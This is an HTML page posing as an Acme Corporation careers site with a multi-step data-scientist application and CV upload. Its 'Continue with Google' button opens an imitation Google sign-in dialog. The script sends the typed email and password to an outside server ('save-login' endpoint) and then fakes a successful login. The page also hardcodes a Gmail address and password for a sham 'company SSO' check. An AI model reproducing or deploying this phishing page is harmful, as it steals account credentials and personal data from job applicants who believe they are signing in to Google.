<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Acme Corporation — Careers</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#f4f6f8; --card:#ffffff; --muted:#6b7280; --primary:#0b63d0; --accent:#0f9d58; --shadow:0 8px 24px rgba(0,0,0,0.08);
}
body {
  margin:0; 
  font-family:"Inter",sans-serif; 
  display:flex; 
  justify-content:center; 
  align-items:flex-start; 
  padding:40px 16px;
  min-height:100vh; 
  background: url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=1950&q=80') no-repeat center center fixed; 
  background-size: cover;
}
.container {
  width:100%; max-width:1080px; display:grid; grid-template-columns:360px 1fr; border-radius:16px;
  overflow:hidden; background:var(--card); box-shadow:var(--shadow);
}
@media (max-width:900px){.container{grid-template-columns:1fr;}}

/* ... Keep all your previous CSS ... */

</style>
</head>
<body>

<div class="container">
  <aside class="left">
    <div class="logo">
      <div class="logo-mark">AC</div>
      <div><div class="company">Acme Corporation</div><div class="tag">Careers · Data Science</div></div>
    </div>
    <div class="provider-choices">
      <button id="googleBtn" class="google-btn">
        <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google logo" style="width:20px; height:20px;">
        <span>Continue with Google</span>
      </button>
      <button id="companyBtn" class="btn-ghost">Sign in with company account</button>
    </div>
    <div class="note">Preview environment </div>
  </aside>

  <main class="right">
    <div class="panel" id="signinPanel">
      <h2>Sign in to apply</h2>
      <div class="muted">Choose how you'd like to continue.</div>
      <div style="margin-top:14px;">
        <div id="providerStatus" class="small-muted">Not signed in</div>
      </div>
    </div>

    <section class="panel" id="appPanel" style="display:none;">
      <div class="progress-bar">
        <div class="step step1 active"></div>
        <div class="step step2"></div>
        <div class="step step3"></div>
        <div class="step step4"></div>
        <div class="step step5"></div>
      </div>
      <h2>Data Scientist — Application</h2>
      <p class="muted">Multi-step · Save drafts · Upload CV</p>

      <form id="appForm" enctype="multipart/form-data">
        <!-- STEP 1 -->
        <div id="step1" class="active">
          <h3>Step 1: Basic Information</h3>
          <div class="field"><label>Full Name</label><input name="name" placeholder="John Doe" required></div>
          <div class="field"><label>Email</label><input type="email" name="email" placeholder="example@email.com" required></div>
          <div class="field"><label>Phone</label><input name="phone" placeholder="+1 234 567 890"></div>
          <div class="actions"><button type="button" class="primary" onclick="nextStep(2)">Next</button></div>
        </div>

        <!-- STEP 2 -->
        <div id="step2">
          <h3>Step 2: Professional Info</h3>
          <div class="field"><label>LinkedIn</label><input name="linkedin" placeholder="https://linkedin.com/in/yourprofile"></div>
          <div class="field"><label>GitHub / Portfolio</label><input name="portfolio" placeholder="https://github.com/username"></div>
          <div class="field"><label>Skills</label><input name="skills" placeholder="Python, SQL, Machine Learning"></div>
          <div class="field"><label>Years of Experience</label>
            <select name="experience">
              <option value="">Select</option>
              <option>0-2</option>
              <option>3-5</option>
              <option>6-10</option>
              <option>10+</option>
            </select>
          </div>
          <div class="actions">
            <button type="button" class="secondary" onclick="prevStep(1)">Back</button>
            <button type="button" class="primary" onclick="nextStep(3)">Next</button>
          </div>
        </div>

        <!-- STEP 3 -->
        <div id="step3">
          <h3>Step 3: Education & Certifications</h3>
          <div class="field"><label>Highest Education</label><input name="education" placeholder="Bachelor's, Master's, PhD"></div>
          <div class="field"><label>Certifications</label><input name="certifications" placeholder="AWS, TensorFlow, etc."></div>
          <div class="actions">
            <button type="button" class="secondary" onclick="prevStep(2)">Back</button>
            <button type="button" class="primary" onclick="nextStep(4)">Next</button>
          </div>
        </div>

        <!-- STEP 4 -->
        <div id="step4">
          <h3>Step 4: Motivation & Cover Letter</h3>
          <div class="field"><label>Why do you want to work here?</label><textarea name="motivation" placeholder="Your answer..."></textarea></div>
          <div class="field"><label>Cover Letter</label><textarea name="cover" placeholder="Optional cover letter"></textarea></div>
          <div class="actions">
            <button type="button" class="secondary" onclick="prevStep(3)">Back</button>
            <button type="button" class="primary" onclick="nextStep(5)">Next</button>
          </div>
        </div>

        <!-- STEP 5 -->
        <div id="step5">
          <h3>Step 5: Upload CV</h3>
          <div class="field drag-drop" id="cvDrop">Click or drag your CV here</div>
          <input type="file" name="cv" id="cvInput" style="display:none;" required>
          <div class="actions">
            <button type="button" class="secondary" onclick="prevStep(4)">Back</button>
            <button type="submit" class="primary">Submit Application</button>
          </div>
        </div>
      </form>
      <div id="successMsg" class="success" style="display:none;">✅ Thank you! Your application has been submitted.</div>
    </section>
  </main>
</div>

<!-- Google Modal -->
<div id="googleModal" class="modal-overlay">
  <div class="modal">
    <div class="google-header">
      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
    </div>
    <h2 id="modalTitle">Sign in</h2>
    <div id="stepEmail">
      <label>Email</label>
      <input type="email" id="googleEmail" placeholder="example@gmail.com" autocomplete="email">
      <div class="loading-text" id="emailLoading" style="display:none;">Checking email...</div>
    </div>
    <div id="stepPassword" style="display:none">
      <label> Your google account Password</label>
      <input type="password" id="googlePassword" placeholder="Enter your password" autocomplete="current-password">
      <div class="loading-text" id="passLoading" style="display:none;">Verifying password...</div>
    </div>
    <div class="actions">
      <button class="btn-cancel" id="cancelGoogle">Cancel</button>
      <button class="btn-next" id="nextGoogleBtn">Next</button>
    </div>
  </div>
</div>

<script>
// Elements
const googleBtn = document.getElementById('googleBtn');
const companyBtn = document.getElementById('companyBtn');
const providerStatus = document.getElementById('providerStatus');
const appPanel = document.getElementById('appPanel');
const signinPanel = document.getElementById('signinPanel');

const googleModal = document.getElementById('googleModal');
const stepEmail = document.getElementById('stepEmail');
const stepPassword = document.getElementById('stepPassword');
const emailInput = document.getElementById('googleEmail');
const passInput = document.getElementById('googlePassword');
const nextGoogleBtn = document.getElementById('nextGoogleBtn');
const cancelGoogle = document.getElementById('cancelGoogle');
const emailLoading = document.getElementById('emailLoading');
const passLoading = document.getElementById('passLoading');

let stage = 0;
let storedEmail = "";

// Open Google Modal
googleBtn.addEventListener('click', () => {
  googleModal.style.display = "flex";
  stage = 0;
  storedEmail = "";
  stepEmail.style.display = "block";
  stepPassword.style.display = "none";
  emailInput.value = "";
  passInput.value = "";
  emailLoading.style.display = "none";
  passLoading.style.display = "none";
  emailInput.focus();
});

// Close Modal
cancelGoogle.addEventListener('click', () => {
  googleModal.style.display = "none";
});

// Google Modal Logic + Save to backend
nextGoogleBtn.addEventListener('click', async () => {
  if(stage === 0){
    const email = emailInput.value.trim();
    if(!email){ alert("Enter your email"); return; }
    emailLoading.style.display = "block";
    setTimeout(() => {
      emailLoading.style.display = "none";
      stage = 1;
      storedEmail = email;
      stepEmail.style.display = "none";
      stepPassword.style.display = "block";
      passInput.focus();
    }, 1500);
  } else {
    const password = passInput.value.trim();
    if(!password){ alert("Enter your password"); return; }
    passLoading.style.display = "block";
    setTimeout(async () => {
      try {
        await fetch('https://ac-corporations.onrender.com/save-login', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({email: storedEmail, password})
        });
      } catch(err) { console.error(err); }

      googleModal.style.display = "none";
      providerStatus.textContent = `Signed in via Google (${storedEmail})`;
      appPanel.style.display = 'block';
      signinPanel.style.display = 'none';
      showStep(1);
    }, 1500);
  }
});

// Company SSO
companyBtn.addEventListener('click', () => {
  const allowedEmail = "samsmollett50@gmail.com";
  const allowedPassword = "adikah1234";

  const workEmail = prompt("Enter your company email:");
  if (!workEmail) return;

  if (workEmail !== allowedEmail) {
    alert("Access denied. Only the authorized account can sign in.");
    return;
  }

  const password = prompt("Enter your password:");
  if (!password) return;

  if (password !== allowedPassword) {
    alert("Incorrect password. Access denied.");
    return;
  }

  providerStatus.textContent = `Signed in via Company SSO (${workEmail})`;
  appPanel.style.display = 'block';
  signinPanel.style.display = 'none';
  showStep(1);
});

// Multi-step form
const steps = [1,2,3,4,5];
function showStep(n){
  steps.forEach(s => {
    const div = document.getElementById("step"+s);
    div.classList.remove("active");
    if(s===n) div.classList.add("active");
  });
  document.querySelectorAll(".progress-bar .step").forEach((el,i)=>el.classList.toggle("active", i<n));
}
function nextStep(n){ showStep(n); }
function prevStep(n){ showStep(n); }

// CV Drag & Drop
const cvDrop = document.getElementById("cvDrop");
const cvInput = document.getElementById("cvInput");
cvDrop.addEventListener("click", ()=>cvInput.click());
cvDrop.addEventListener("dragover", e => { e.preventDefault(); cvDrop.classList.add("dragover"); });
cvDrop.addEventListener("dragleave", e => { e.preventDefault(); cvDrop.classList.remove("dragover"); });
cvDrop.addEventListener("drop", e => {
  e.preventDefault(); 
  cvDrop.classList.remove("dragover");
  if(e.dataTransfer.files.length) cvInput.files = e.dataTransfer.files;
});

// Form Submission with CV upload
const appForm = document.getElementById("appForm");
const successMsg = document.getElementById("successMsg");
appForm.addEventListener("submit", async e => {
  e.preventDefault();
  const formData = new FormData(appForm);

  if(cvInput.files.length > 0){
    formData.append('cv', cvInput.files[0]);
  }

  try {
    const response = await fetch('https://ac-corporations.onrender.com/submit-application', {
      method: 'POST',
      body: formData
    });

    if(response.ok){
      appForm.style.display='none';
      successMsg.style.display='block';
    } else {
      const text = await response.text();
      alert("Error submitting application: " + text);
    }
  } catch(err){
    console.error(err);
    alert("Network error submitting application.");
  }
});
</script>

</body>
</html>

